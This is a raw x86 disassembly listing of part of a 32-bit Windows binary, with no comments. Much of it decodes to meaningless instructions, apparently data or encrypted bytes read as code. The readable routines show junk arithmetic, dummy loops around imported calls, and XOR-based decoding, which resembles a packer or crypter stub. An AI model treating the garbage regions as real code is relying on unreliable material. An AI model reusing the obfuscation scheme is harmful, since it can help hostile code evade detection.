  408a4a:	xchg   ebx,eax
  408a4b:	ds (bad) 
  408a4d:	clc    
  408a4e:	outs   dx,DWORD PTR ds:[esi]
  408a4f:	stos   DWORD PTR es:[edi],eax
  408a50:	(bad)  [ebx]
  408a52:	sub    DWORD PTR [edx+0x59],esp
  408a55:	call   0x8d16:0xc3ff6eab
  408a5c:	mov    edx,0x688a6566
  408a61:	nop
  408a62:	pop    edi
  408a63:	or     al,0xef
  408a65:	fcom   QWORD PTR [ecx]
  408a67:	mov    ds:0x4fd6e9e6,al
  408a6c:	mov    al,0x1c
  408a6e:	sub    eax,0xc806dbc4
  408a73:	aad    0xf
  408a75:	bound  edx,QWORD PTR [esi-0x70367ecc]
  408a7b:	sbb    eax,0xc18b8116
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e76a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e76a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e76a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430496
  408ab1:	push   0x42ee30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42eaac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e76a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e76a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e766,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4304c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	fsub   DWORD PTR [ecx-0x2d5a460e]
  408b18:	jle    0x408b98
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b8f
  408b1f:	int3   
  408b20:	ss stos DWORD PTR es:[edi],eax
  408b22:	cwde   
  408b23:	jnp    0x408b41
  408b25:	aam    0xd8
  408b27:	inc    ebp
  408b28:	or     al,0xa0
  408b2a:	push   edi
  408b2b:	pop    ecx
  408b2c:	loop   0x408b84
  408b2e:	enter  0x79ea,0x5e
  408b32:	ins    DWORD PTR es:[edi],dx
  408b33:	push   es
  408b34:	mov    WORD PTR [ebp-0x3a],es
  408b37:	jnp    0x408ada
  408b39:	sub    DWORD PTR [edx],0x67
  408b3c:	les    esi,FWORD PTR [edi]
  408b3e:	or     DWORD PTR [ebx+0x472c0d0a],edx
  408b44:	sbb    BYTE PTR [eax+0x146dde19],ah
  408b4a:	fisubr WORD PTR [esp+ecx*8+0x3]
  408b4e:	pop    ebx
  408b4f:	mov    esi,0x74fc67cf
  408b55:	pop    edx
  408b56:	clc    
  408b57:	xor    esi,DWORD PTR [eax]
  408b59:	rcr    esi,1
  408b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b5c:	mov    ebp,0x9219fad7
  408b61:	cs (bad) 
  408b63:	sbb    cl,dl
  408b65:	xchg   edi,eax
  408b66:	jecxz  0x408bcc
  408b68:	xchg   DWORD PTR [esp+eax*2-0x3e26afd1],esi
  408b6f:	push   esp
  408b70:	xor    ecx,ecx
  408b72:	cwde   
  408b73:	shl    DWORD PTR [esi],1
  408b75:	cld    
  408b76:	call   0x9e5b:0xdd7ebff
  408b7d:	jno    0x408bcb
  408b7f:	mov    ah,dh
  408b81:	stos   DWORD PTR es:[edi],eax
  408b82:	mov    ebp,0x1c54bd74
  408b87:	in     eax,dx
  408b88:	push   0x1d
  408b8a:	and    DWORD PTR [eax+0x57],edi
  408b8d:	dec    ebp
  408b8e:	adc    al,BYTE PTR [ebp-0x80]
  408b91:	stos   DWORD PTR es:[edi],eax
  408b92:	inc    edx
  408b93:	xchg   cl,dh
  408b95:	test   BYTE PTR [ebx+edx*2],cl
  408b98:	das    
  408b99:	mov    al,ds:0x3d72a6f6
  408b9e:	daa    
  408b9f:	add    esp,DWORD PTR ds:0x838c60a5
  408ba5:	retf   
  408ba6:	xor    eax,0xddb431d5
  408bab:	cdq    
  408bac:	xchg   esi,eax
  408bad:	mov    edi,0x3904ba1e
  408bb2:	ret    
  408bb3:	sbb    eax,0x750aa152
  408bb8:	mov    ch,0x65
  408bba:	and    esp,DWORD PTR [edi+edi*8+0x64]
  408bbe:	nop
  408bbf:	or     ebx,DWORD PTR [ebx-0x34f488cd]
  408bc5:	out    dx,eax
  408bc6:	mov    ss,WORD PTR [eax-0x63fe37e]
  408bcc:	inc    esi
  408bcd:	or     al,0x75
  408bcf:	ins    DWORD PTR es:[edi],dx
  408bd0:	push   edx
  408bd1:	dec    edi
  408bd2:	lahf   
  408bd3:	cmp    ecx,DWORD PTR [ebp+0x54]
  408bd6:	cwde   
  408bd7:	xor    al,0x92
  408bd9:	bound  edx,QWORD PTR [ebx-0x99f4177]
  408bdf:	pop    ds
  408be0:	add    al,0x4a
  408be2:	test   al,0x8d
  408be4:	fs retf 0x8bb7
  408be8:	sbb    BYTE PTR [esi-0x28],al
  408beb:	aad    0x69
  408bed:	cmp    bl,BYTE PTR [esi]
  408bef:	mov    eax,ds:0xb86af4f
  408bf4:	mov    al,0x42
  408bf6:	push   esp
  408bf7:	sbb    BYTE PTR [esi+0x56],0xb3
  408bfb:	shl    BYTE PTR [ebp-0x40],0x5c
  408bff:	call   0x324ff5db
  408c04:	adc    DWORD PTR [eax-0x2b5ccdb0],0x78
  408c0b:	shr    BYTE PTR [esi-0x22],0x49
  408c0f:	in     eax,0xf5
  408c11:	iret   
  408c12:	xchg   edi,eax
  408c13:	mov    bl,0x7d
  408c15:	retf   0x5078
  408c18:	es div ecx
  408c1b:	aam    0xde
  408c1d:	dec    esi
  408c1e:	sub    al,0xcc
  408c20:	aam    0x7f
  408c22:	std    
  408c23:	pushf  
  408c24:	aad    0xe6
  408c26:	push   cs
  408c27:	sahf   
  408c28:	dec    esi
  408c29:	and    DWORD PTR [ebp+ebx*8-0x34],esi
  408c2d:	rcl    DWORD PTR [ebp+eiz*8-0x145312ea],cl
  408c34:	shr    BYTE PTR [edi+eiz*4-0x39],cl
  408c38:	jmp    0x408c25
  408c3a:	push   ss
  408c3b:	mov    eax,0xe4c6e42a
  408c40:	jbe    0x408bc3
  408c42:	nop    DWORD PTR [edi]
  408c45:	mov    BYTE PTR [esi+edx*4],0x5c
  408c49:	cmp    edi,esi
  408c4b:	sub    DWORD PTR [esi-0x72],eax
  408c4e:	cdq    
  408c4f:	mov    bh,0x67
  408c51:	sub    BYTE PTR ds:0xda053ed4,ch
  408c57:	das    
  408c58:	aas    
  408c59:	push   ebx
  408c5a:	scas   eax,DWORD PTR es:[edi]
  408c5b:	jle    0x408c75
  408c5d:	and    bl,cl
  408c5f:	scas   eax,DWORD PTR es:[edi]
  408c60:	mov    WORD PTR [eax+0x33],es
  408c63:	popf   
  408c64:	dec    esp
  408c65:	aam    0x9d
  408c67:	add    cl,0xda
  408c6a:	loope  0x408c30
  408c6c:	jnp    0x408c1d
  408c6e:	pop    ecx
  408c6f:	jle    0x408cc5
  408c71:	retf   0x3c18
  408c74:	cmp    eax,0x711cbc2e
  408c79:	sub    eax,0x47ca0664
  408c7e:	fnsave [edx+0x55]
  408c81:	into   
  408c82:	je     0x408c19
  408c84:	sti    
  408c85:	cwde   
  408c86:	pop    ds
  408c87:	mov    bh,0x6e
  408c89:	dec    ebx
  408c8a:	aam    0xd3
  408c8c:	add    DWORD PTR [eax],eax
  408c8e:	jo     0x408c4f
  408c90:	repnz les esp,FWORD PTR [edx-0x56f45ae3]
  408c97:	in     eax,0xa2
  408c99:	add    BYTE PTR [esi],0x68
  408c9c:	adc    al,dl
  408c9e:	mov    bl,0xff
  408ca0:	mov    al,0xbd
  408ca2:	inc    esp
  408ca3:	push   esi
  408ca4:	mov    DWORD PTR [ecx-0x44],0x4dd8a6b6
  408cab:	mov    ebx,0xc8707943
  408cb0:	add    esi,esi
  408cb2:	inc    ebp
  408cb3:	xchg   ecx,eax
  408cb4:	xchg   esi,eax
  408cb5:	jnp    0x408c4b
  408cb7:	dec    esi
  408cb8:	and    dh,bh
  408cba:	push   ds
  408cbb:	icebp  
  408cbc:	popa   
  408cbd:	and    BYTE PTR [eax],ch
  408cbf:	imul   ebx,DWORD PTR [esi-0x43],0x30
  408cc3:	fsubrp st(2),st
  408cc5:	pop    esp
  408cc6:	imul   esi,DWORD PTR ds:0x9afd0645,0x7e
  408ccd:	cli    
  408cce:	sbb    BYTE PTR [ebp-0x408c6608],ch
  408cd4:	fisttp QWORD PTR [ebx-0x7f]
  408cd7:	icebp  
  408cd8:	push   esi
  408cd9:	mov    eax,0x4296a8b0
  408cde:	aam    0x2a
  408ce0:	xor    dh,BYTE PTR [eax+0x7b5c592]
  408ce6:	xor    bl,BYTE PTR ds:0xbb01cc68
  408cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ced:	fstp   QWORD PTR [ebp+0x5de2e1af]
  408cf3:	add    ecx,DWORD PTR [ebp+0x5]
  408cf6:	popf   
  408cf7:	jb     0x408d2b
  408cf9:	add    BYTE PTR [ecx+0x76158b02],cl
  408cff:	add    eax,0x92a10043
  408d04:	add    eax,0xd02b0043
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	and    ch,BYTE PTR [edi-0x2b]
  408d57:	cs mov esp,ss
  408d5a:	jle    0x408dda
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d8b
  408d61:	push   ebp
  408d62:	fs ret 0x7a60
  408d66:	ds (bad) 
  408d68:	iret   
  408d69:	rol    BYTE PTR [esi-0x1a],1
  408d6c:	sti    
  408d6d:	add    dh,BYTE PTR [eax+0x10]
  408d70:	pop    edx
  408d71:	call   FWORD PTR [edi+0x66]
  408d74:	(bad)  
  408d75:	ret    
  408d76:	mov    al,0xcb
  408d78:	mov    cl,0x9f
  408d7a:	xchg   esi,eax
  408d7b:	(bad)  
  408d7d:	fisttp WORD PTR [esi-0x4c]
  408d80:	or     edi,edi
  408d82:	ja     0x408d15
  408d84:	xchg   edx,eax
  408d85:	call   0xc343d176
  408d8a:	pop    ss
  408d8b:	test   DWORD PTR [ebp+edi*8+0x6a7b3b96],0x8c14b2f5
  408d96:	ds pusha 
  408d98:	mov    dh,0xf4
  408d9a:	xchg   BYTE PTR [ebp+edx*1+0x2e],bh
  408d9e:	add    BYTE PTR ds:0x58cc8914,ch
  408da4:	push   es
  408da5:	(bad)  
  408da6:	call   0x33a6c06b
  408dab:	imul   edi,DWORD PTR ds:0x9544eed8,0xffffffb5
  408db2:	call   0x44403191
  408db7:	sub    eax,0xbba63b8
  408dbc:	dec    ebp
  408dbd:	mov    ch,0x2e
  408dbf:	loop   0x408e12
  408dc1:	rcr    BYTE PTR [ebx],0xb5
  408dc4:	inc    ebp
  408dc5:	adc    eax,0x903b553a
  408dca:	shl    BYTE PTR [edx+0x41e45406],0xaa
  408dd1:	mov    ds:0xa52f8b6a,eax
  408dd6:	sub    eax,0x892a41af
  408ddb:	and    BYTE PTR [edi],cl
  408ddd:	call   0x74d7:0xfe639df3
  408de4:	(bad)  
  408de5:	ficomp DWORD PTR [ecx+0x7b]
  408de8:	jle    0x408d6c
  408dea:	mov    ah,BYTE PTR [ecx+0x30]
  408ded:	mov    ch,0x41
  408def:	test   DWORD PTR [ebx],esi
  408df1:	hlt    
  408df2:	int3   
  408df3:	add    ebp,DWORD PTR [ecx-0x73]
  408df6:	scas   eax,DWORD PTR es:[edi]
  408df7:	ins    BYTE PTR es:[edi],dx
  408df8:	ss inc ecx
  408dfa:	in     eax,dx
  408dfb:	data16 jle 0x408dd9
  408dfe:	and    al,0xdd
  408e00:	dec    ebx
  408e01:	pushf  
  408e02:	shl    dl,cl
  408e04:	(bad)
  408e07:	nop    DWORD PTR [ebx]
  408e0a:	rol    BYTE PTR ds:[edi+0x26],0xe7
  408e0f:	and    BYTE PTR [esi+ebp*8-0x34],al
  408e13:	mov    eax,0x27aea3a0
  408e18:	rol    BYTE PTR [esi-0x4a],1
  408e1b:	shl    BYTE PTR [edx],1
  408e1d:	sahf   
  408e1e:	push   esp
  408e1f:	daa    
  408e20:	or     BYTE PTR [edi+0x7611a2de],ah
  408e26:	sahf   
  408e27:	pop    edi
  408e28:	fstp   DWORD PTR [ebp+edi*2-0x7873a8aa]
  408e2f:	xor    DWORD PTR [ebp-0x7e],ecx
  408e32:	jbe    0x408e0d
  408e34:	adc    DWORD PTR [edi-0x262807f1],ebp
  408e3a:	adc    BYTE PTR [edx],dh
  408e3c:	jno    0x408dee
  408e3e:	and    BYTE PTR ds:0xfa0d937f,bh
  408e44:	sub    al,0xb4
  408e46:	mov    al,0x6c
  408e48:	mov    ebx,0x522eebfb
  408e4d:	outs   dx,BYTE PTR ds:[esi]
  408e4e:	bswap  edi
  408e50:	pop    eax
  408e51:	(bad)  
  408e52:	loopne 0x408ecd
  408e54:	arpl   WORD PTR [esi],sp
  408e56:	mov    cl,0xbc
  408e58:	mov    esi,edx
  408e5a:	scas   al,BYTE PTR es:[edi]
  408e5b:	cmp    esp,DWORD PTR [ebx]
  408e5d:	push   ebx
  408e5e:	pushf  
  408e5f:	leave  
  408e60:	test   eax,0xb984e303
  408e65:	xor    cl,BYTE PTR [ebp-0x56]
  408e68:	ret    
  408e69:	lods   al,BYTE PTR fs:[esi]
  408e6b:	jp     0x408ed1
  408e6d:	sub    al,0xa2
  408e6f:	test   eax,0x53a42022
  408e74:	js     0x408e55
  408e76:	or     al,0x7
  408e78:	ss cmp al,0xe0
  408e7b:	mov    edi,0xb7af4472
  408e80:	(bad)  
  408e81:	and    BYTE PTR [eax-0x11],bl
  408e84:	mov    dh,0x87
  408e86:	cmp    eax,0x1e732771
  408e8b:	aad    0x9
  408e8d:	push   cs
  408e8e:	sbb    DWORD PTR [ebx-0x32],eax
  408e91:	push   cs
  408e92:	mov    al,0x42
  408e94:	push   esp
  408e95:	(bad)  
  408e96:	jae    0x408e9d
  408e98:	jbe    0x408e41
  408e9a:	call   FWORD PTR [edi]
  408e9c:	lods   al,BYTE PTR ds:[esi]
  408e9d:	sub    dl,ah
  408e9f:	sbb    DWORD PTR [edx*2+0x6448a0ad],eax
  408ea6:	pop    ss
  408ea7:	dec    edx
  408ea8:	xor    al,0xc6
  408eaa:	stos   DWORD PTR es:[edi],eax
  408eab:	cmp    al,0x1f
  408ead:	sub    cl,BYTE PTR [eax+0x42]
  408eb0:	in     eax,dx
  408eb1:	loop   0x408e60
  408eb3:	jb     0x408f1e
  408eb5:	loop   0x408f2e
  408eb7:	ret    0xade8
  408eba:	sbb    esi,DWORD PTR [eax+0x23]
  408ebd:	lds    esi,FWORD PTR [eax]
  408ebf:	push   ecx
  408ec0:	sbb    eax,DWORD PTR [ebx-0x78]
  408ec3:	repz fimul WORD PTR es:0xecd5ad01
  408ecb:	fnsave [edx]
  408ecd:	cmp    BYTE PTR [edx+0x5c],cl
  408ed0:	xor    bh,dl
  408ed2:	daa    
  408ed3:	jecxz  0x408f2b
  408ed5:	inc    esi
  408ed6:	xor    al,0x8a
  408ed8:	sbb    ebx,DWORD PTR [eax+0x247cff08]
  408ede:	jge    0x408ee5
  408ee0:	and    DWORD PTR [ebx-0x16609ca0],edx
  408ee6:	cmp    eax,0x45d1d2bb
  408eeb:	pushf  
  408eec:	out    dx,eax
  408eed:	fmul   QWORD PTR [ebp+0x5f]
  408ef0:	sti    
  408ef1:	pop    edi
  408ef2:	sub    eax,0x6ba5cba0
  408ef7:	cld    
  408ef8:	aam    0xaa
  408efa:	inc    BYTE PTR [edi-0x43ce64aa]
  408f00:	js     0x408ef2
  408f02:	mov    esi,0x376dd3c2
  408f07:	or     BYTE PTR [ebx+eiz*1-0x113a1b01],dl
  408f0e:	fisttp DWORD PTR [ebx]
  408f10:	inc    edi
  408f11:	fsub   st(7),st
  408f13:	retf   0xe00d
  408f16:	popa   
  408f17:	add    edi,ebx
  408f19:	xor    eax,0xe9d4c337
  408f1e:	cmp    al,0xf0
  408f20:	pop    ebp
  408f21:	adc    ebx,DWORD PTR [eax]
  408f23:	push   ecx
  408f24:	dec    ebx
  408f25:	sub    eax,0xcac548fe
  408f2a:	(bad)  [ecx]
  408f2c:	cmp    eax,0x583ef595
  408f31:	jo     0x408ec4
  408f33:	fild   DWORD PTR [eax-0x3eccdbf9]
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ee08,0x42e76a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430546,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ee28,0x42e766
  408f71:	call   DWORD PTR ds:0x42ea4c
  408f77:	sbb    DWORD PTR ds:0x42e762,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4304ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4304b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42eb04
  408faf:	sbb    DWORD PTR ds:0x430552,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e75a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4304c2,0x42ee08
  408fe0:	call   DWORD PTR ds:0x42eb80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ee24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42eb44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43055a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ee14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e762,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ea3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4304aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ee24,0x43049a
  409056:	call   DWORD PTR ds:0x42eadc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e762,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e762
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e762,ebx
  40907e:	cmp    DWORD PTR ds:0x42e762,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ebac
  409097:	cmp    DWORD PTR ds:0x42e762,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ee14
  4090aa:	and    DWORD PTR ds:0x42ee20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43048e
  4090bc:	sbb    edx,DWORD PTR ds:0x43054e
  4090c2:	mov    DWORD PTR ds:0x43048e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43049e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43049e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43049e,edx
  4090e2:	cmp    DWORD PTR ds:0x43049e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e77a
  4090f9:	push   0x42e8ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ebb0
  409109:	cmp    DWORD PTR ds:0x43049e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e766,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e766
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e766,edx
  40912d:	cmp    DWORD PTR ds:0x42e766,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42eab0
  40914a:	cmp    DWORD PTR ds:0x42e766,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43049a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43048a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43048a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43048a,esi
  40917b:	cmp    DWORD PTR ds:0x43048a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e87b
  40918d:	push   0x42e77a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42eac8
  40919d:	cmp    DWORD PTR ds:0x43048a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43048a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43048a,esi
  4091b7:	cmp    DWORD PTR ds:0x43048a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ee1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43054e,0x4304a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43054e
  4091fe:	adc    DWORD PTR ds:0x42ee18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43048e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43048e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43048e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43049e,0x4304ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4304ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4304e2
  409277:	mov    eax,ds:0x42e99c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e76e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4304aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4304ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4304b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430556,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ee20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ee20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ee20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42eacc
  409310:	mov    edi,DWORD PTR ds:0x42ee20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ee20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ee14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e776,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e772
  40934d:	adc    edx,DWORD PTR ds:0x4304c2
  409353:	mov    DWORD PTR ds:0x42e772,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ee2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ee2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ee2c,edi
  409376:	cmp    DWORD PTR ds:0x42ee2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e766
  40938b:	call   DWORD PTR ds:0x42ebb4
  409391:	cmp    DWORD PTR ds:0x42ee2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ee2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ee2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ee2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4304b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ee28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ee28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ee28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ee28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ee28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ead0
  409402:	cmp    DWORD PTR ds:0x42ee28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ee28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ee28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ee0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ee0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ee0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42eab4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ee0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ee0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43055a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43048a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43049e
  409480:	adc    edi,DWORD PTR ds:0x42ee18
  409486:	mov    DWORD PTR ds:0x43049e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ee30,0x42e76a
